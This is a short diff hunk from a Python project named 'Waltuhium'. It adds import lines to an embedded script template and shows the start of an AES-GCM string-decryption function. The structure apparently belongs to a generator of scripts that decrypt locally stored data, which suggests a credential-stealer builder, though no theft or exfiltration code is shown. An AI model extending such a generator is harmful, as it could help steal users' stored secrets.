@@ -10,6 +10,20 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 Waltuhium_Modules = "import ctypes, platform ,json, sys, shutil, sqlite3\nimport re, os, asyncio, aiohttp, time, base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend"
 Decrypt_Func_Script = """
+import ctypes, platform
+import json, sys
+import shutil
+import sqlite3
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import re
+import os
+import asyncio
+import aiohttp
+import base64
+import time
+
+
 def DecryptString(key, tag, nonce, _input) -> str:
     cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
     decryptor = cipher.decryptor()
